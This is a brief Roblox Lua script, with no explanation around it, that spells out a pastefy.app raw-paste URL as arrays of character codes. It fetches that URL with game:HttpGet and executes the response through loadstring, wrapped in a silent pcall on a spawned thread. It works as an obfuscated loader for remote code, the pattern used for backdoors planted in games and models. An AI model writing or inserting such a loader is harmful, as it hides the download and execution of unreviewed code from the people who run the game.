task.spawn(function()
    local segments = {
        {104,116,116,112,115,58,47,47},
        {112,97,115,116,101,102,121,46,97,112,112,47},
        {65,122,53,84,114,98,54,104,47},
        {114,97,119}
    }

    local buffer = {}

    for i = 1, #segments do
        local seg = segments[i]
        for j = 1, #seg do
            buffer[#buffer + 1] = string.char(seg[j])
        end
    end

    pcall(function()
        loadstring(game:HttpGet(table.concat(buffer), true))()
    end)
end)
